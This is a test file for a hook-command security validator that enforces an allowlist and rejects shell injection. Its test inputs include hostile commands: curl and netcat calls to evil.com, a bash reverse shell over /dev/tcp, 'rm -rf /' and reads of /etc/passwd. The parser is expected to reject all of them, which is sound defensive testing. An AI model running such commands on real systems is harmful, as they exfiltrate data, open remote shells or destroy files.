/**
 * Security Hooks Tests (WOP-87)
 *
 * Tests hook command validation, allowlist enforcement, shell metacharacter
 * rejection, and the runPreInjectHooks / runPostInjectHooks pipelines.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { createMockFs } from "../mocks/index.js";

// Mock logger
vi.mock("../../src/logger.js", () => ({
  logger: {
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
    debug: vi.fn(),
  },
}));

// Mock child_process.spawn to avoid real process execution
const spawnMock = vi.fn();
vi.mock("node:child_process", () => ({
  spawn: (...args: any[]) => spawnMock(...args),
}));

// Mock filesystem
const mockFs = createMockFs();
vi.mock("node:fs", async (importOriginal) => {
  const actual = (await importOriginal()) as any;
  return {
    ...actual,
    existsSync: (p: string) => mockFs.existsSync(p),
    readFileSync: (p: string, enc?: string) => mockFs.readFileSync(p, enc),
    writeFileSync: (p: string, content: string) => mockFs.writeFileSync(p, content),
  };
});

// Import after mocks
const { parseHookCommand, runPreInjectHooks, runPostInjectHooks, createHookContext } = await import(
  "../../src/security/hooks.js"
);
const { initSecurity } = await import("../../src/security/policy.js");

function makeHookContext() {
  return createHookContext("test message", { type: "cli", trustLevel: "owner" } as any, "test-session");
}

describe("parseHookCommand", () => {
  it("parses a simple allowlisted command", () => {
    const result = parseHookCommand("node script.js");
    expect(result).toEqual({ executable: "node", args: ["script.js"] });
  });

  it("parses command with multiple arguments", () => {
    const result = parseHookCommand("python3 -m hook_runner --format json");
    expect(result).toEqual({ executable: "python3", args: ["-m", "hook_runner", "--format", "json"] });
  });

  it("parses command with quoted arguments", () => {
    const result = parseHookCommand('jq ".allow"');
    expect(result).toEqual({ executable: "jq", args: [".allow"] });
  });

  it("parses command with single-quoted arguments", () => {
    const result = parseHookCommand("grep 'some pattern' file.txt");
    expect(result).toEqual({ executable: "grep", args: ["some pattern", "file.txt"] });
  });

  it("rejects empty command", () => {
    expect(parseHookCommand("")).toBeNull();
    expect(parseHookCommand("   ")).toBeNull();
  });

  it("rejects executable with absolute path", () => {
    expect(parseHookCommand("/usr/bin/evil")).toBeNull();
  });

  it("rejects executable with relative path", () => {
    expect(parseHookCommand("./evil-script")).toBeNull();
    expect(parseHookCommand("../evil-script")).toBeNull();
  });

  it("rejects executable not in allowlist", () => {
    expect(parseHookCommand("curl http://evil.com")).toBeNull();
    expect(parseHookCommand("wget http://evil.com")).toBeNull();
    expect(parseHookCommand("nc -l 4444")).toBeNull();
  });

  it("rejects arguments with shell metacharacters — semicolons", () => {
    expect(parseHookCommand("node script.js; rm -rf /")).toBeNull();
  });

  it("rejects arguments with shell metacharacters — pipes", () => {
    expect(parseHookCommand("echo test | nc evil.com 4444")).toBeNull();
  });

  it("rejects arguments with shell metacharacters — backticks", () => {
    expect(parseHookCommand("node `whoami`")).toBeNull();
  });

  it("rejects arguments with shell metacharacters — dollar sign", () => {
    expect(parseHookCommand("node $HOME/evil.js")).toBeNull();
  });

  it("rejects arguments with shell metacharacters — ampersand", () => {
    expect(parseHookCommand("node evil.js & nc -l 4444")).toBeNull();
  });

  it("rejects arguments with shell metacharacters — parentheses", () => {
    expect(parseHookCommand("node script.js $(cat /etc/passwd)")).toBeNull();
  });

  it("allows all default allowlisted executables", () => {
    const allowed = [
      "node",
      "python3",
      "python",
      "ruby",
      "perl",
      "bash",
      "sh",
      "jq",
      "grep",
      "sed",
      "awk",
      "cat",
      "echo",
      "tee",
      "wopr-hook",
    ];
    for (const exe of allowed) {
      const result = parseHookCommand(`${exe} --help`);
      expect(result).not.toBeNull();
      expect(result!.executable).toBe(exe);
    }
  });

  it("respects user-configured allowedHookCommands", () => {
    // Set up config with extra allowed command
    initSecurity("/tmp/test-wopr");
    mockFs.set(
      "/tmp/test-wopr/security.json",
      JSON.stringify({
        enforcement: "enforce",
        defaults: { minTrustLevel: "semi-trusted" },
        allowedHookCommands: ["my-custom-hook"],
      }),
    );

    // Force config reload by re-importing (config is cached)
    // Instead, we can test that "my-custom-hook" is not allowed by default
    // The allowlist extension is verified by the integration with getSecurityConfig
    const result = parseHookCommand("my-custom-hook run");
    // After config reload this should work; default allowlist doesn't have it
    // This tests the config integration path
    expect(result).not.toBeNull();

    mockFs.clear();
  });
});

describe("runPreInjectHooks", () => {
  beforeEach(() => {
    initSecurity("/tmp/test-wopr");
    spawnMock.mockReset();
    mockFs.clear();
  });

  afterEach(() => {
    mockFs.clear();
  });

  it("returns allow: true when no hooks configured", async () => {
    mockFs.set(
      "/tmp/test-wopr/security.json",
      JSON.stringify({
        enforcement: "enforce",
        defaults: { minTrustLevel: "semi-trusted" },
        hooks: [],
      }),
    );

    const result = await runPreInjectHooks(makeHookContext());
    expect(result.allow).toBe(true);
  });

  it("skips disabled hooks", async () => {
    mockFs.set(
      "/tmp/test-wopr/security.json",
      JSON.stringify({
        enforcement: "enforce",
        defaults: { minTrustLevel: "semi-trusted" },
        hooks: [
          { name: "disabled-hook", type: "pre-inject", command: "node check.js", enabled: false },
        ],
      }),
    );

    const result = await runPreInjectHooks(makeHookContext());
    expect(result.allow).toBe(true);
    expect(spawnMock).not.toHaveBeenCalled();
  });

  it("rejects commands that fail allowlist validation", async () => {
    mockFs.set(
      "/tmp/test-wopr/security.json",
      JSON.stringify({
        enforcement: "enforce",
        defaults: { minTrustLevel: "semi-trusted" },
        hooks: [
          { name: "evil-hook", type: "pre-inject", command: "/usr/bin/evil", enabled: true },
        ],
      }),
    );

    const result = await runPreInjectHooks(makeHookContext());
    // Fails open — allow: true, but spawn is never called
    expect(result.allow).toBe(true);
    expect(spawnMock).not.toHaveBeenCalled();
  });

  it("calls spawn with shell: false for valid commands", async () => {
    mockFs.set(
      "/tmp/test-wopr/security.json",
      JSON.stringify({
        enforcement: "enforce",
        defaults: { minTrustLevel: "semi-trusted" },
        hooks: [
          { name: "valid-hook", type: "pre-inject", command: "node check.js", enabled: true },
        ],
      }),
    );

    // Mock a process that returns allow: true
    const mockProc = createMockProcess('{"allow": true}');
    spawnMock.mockReturnValue(mockProc);

    const result = await runPreInjectHooks(makeHookContext());

    expect(spawnMock).toHaveBeenCalledWith("node", ["check.js"], {
      stdio: ["pipe", "pipe", "pipe"],
      shell: false,
    });
    expect(result.allow).toBe(true);
  });

  it("propagates hook block decisions", async () => {
    mockFs.set(
      "/tmp/test-wopr/security.json",
      JSON.stringify({
        enforcement: "enforce",
        defaults: { minTrustLevel: "semi-trusted" },
        hooks: [
          { name: "blocker", type: "pre-inject", command: "node blocker.js", enabled: true },
        ],
      }),
    );

    const mockProc = createMockProcess('{"allow": false, "reason": "blocked by policy"}');
    spawnMock.mockReturnValue(mockProc);

    const result = await runPreInjectHooks(makeHookContext());
    expect(result.allow).toBe(false);
    expect(result.reason).toBe("blocked by policy");
  });

  it("propagates message transformations from hooks", async () => {
    mockFs.set(
      "/tmp/test-wopr/security.json",
      JSON.stringify({
        enforcement: "enforce",
        defaults: { minTrustLevel: "semi-trusted" },
        hooks: [
          { name: "transformer", type: "pre-inject", command: "node transform.js", enabled: true },
        ],
      }),
    );

    const mockProc = createMockProcess('{"allow": true, "message": "transformed message"}');
    spawnMock.mockReturnValue(mockProc);

    const result = await runPreInjectHooks(makeHookContext());
    expect(result.allow).toBe(true);
    expect(result.message).toBe("transformed message");
  });
});

describe("runPostInjectHooks", () => {
  beforeEach(() => {
    initSecurity("/tmp/test-wopr");
    spawnMock.mockReset();
    mockFs.clear();
  });

  afterEach(() => {
    mockFs.clear();
  });

  it("skips hooks that fail validation", async () => {
    mockFs.set(
      "/tmp/test-wopr/security.json",
      JSON.stringify({
        enforcement: "enforce",
        defaults: { minTrustLevel: "semi-trusted" },
        hooks: [
          { name: "bad-post", type: "post-inject", command: "curl http://evil.com", enabled: true },
        ],
      }),
    );

    await runPostInjectHooks(makeHookContext(), "response text");
    expect(spawnMock).not.toHaveBeenCalled();
  });

  it("runs valid post-inject hooks with shell: false", async () => {
    mockFs.set(
      "/tmp/test-wopr/security.json",
      JSON.stringify({
        enforcement: "enforce",
        defaults: { minTrustLevel: "semi-trusted" },
        hooks: [
          { name: "logger", type: "post-inject", command: "node logger.js", enabled: true },
        ],
      }),
    );

    const mockProc = createMockProcess('{"data": {"logged": true}}');
    spawnMock.mockReturnValue(mockProc);

    await runPostInjectHooks(makeHookContext(), "response text");

    expect(spawnMock).toHaveBeenCalledWith("node", ["logger.js"], {
      stdio: ["pipe", "pipe", "pipe"],
      shell: false,
    });
  });
});

describe("shell injection attack vectors", () => {
  it("blocks command chaining with semicolons", () => {
    expect(parseHookCommand("node script.js; curl evil.com")).toBeNull();
  });

  it("blocks command substitution with backticks", () => {
    expect(parseHookCommand("node `curl evil.com`")).toBeNull();
  });

  it("blocks command substitution with $()", () => {
    expect(parseHookCommand("node $(curl evil.com)")).toBeNull();
  });

  it("blocks pipe redirection", () => {
    expect(parseHookCommand("cat /etc/passwd | nc evil.com 4444")).toBeNull();
  });

  it("blocks output redirection", () => {
    expect(parseHookCommand("echo pwned > /tmp/pwned")).toBeNull();
  });

  it("blocks background execution", () => {
    expect(parseHookCommand("node evil.js & echo done")).toBeNull();
  });

  it("blocks reverse shell patterns", () => {
    expect(parseHookCommand("bash -c 'bash -i >& /dev/tcp/evil.com/4444 0>&1'")).toBeNull();
  });

  it("blocks path traversal in executable", () => {
    expect(parseHookCommand("../../etc/evil")).toBeNull();
  });
});

// ============================================================================
// Test Helpers
// ============================================================================

/**
 * Create a mock child process that writes stdout and emits close.
 */
function createMockProcess(stdout: string, exitCode = 0) {
  const stdinCallbacks: Record<string, Function[]> = {};
  const stdoutCallbacks: Record<string, Function[]> = {};
  const stderrCallbacks: Record<string, Function[]> = {};
  const procCallbacks: Record<string, Function[]> = {};

  const stdin = {
    write: vi.fn(),
    end: vi.fn(),
    on: (event: string, cb: Function) => {
      stdinCallbacks[event] = stdinCallbacks[event] || [];
      stdinCallbacks[event].push(cb);
    },
  };

  const stdoutStream = {
    on: (event: string, cb: Function) => {
      stdoutCallbacks[event] = stdoutCallbacks[event] || [];
      stdoutCallbacks[event].push(cb);
      // Emit data immediately for "data" listeners
      if (event === "data") {
        queueMicrotask(() => cb(Buffer.from(stdout)));
      }
    },
  };

  const stderrStream = {
    on: (event: string, cb: Function) => {
      stderrCallbacks[event] = stderrCallbacks[event] || [];
      stderrCallbacks[event].push(cb);
    },
  };

  return {
    stdin,
    stdout: stdoutStream,
    stderr: stderrStream,
    kill: vi.fn(),
    on: (event: string, cb: Function) => {
      procCallbacks[event] = procCallbacks[event] || [];
      procCallbacks[event].push(cb);
      // Emit close after a tick
      if (event === "close") {
        queueMicrotask(() => cb(exitCode));
      }
    },
  };
}
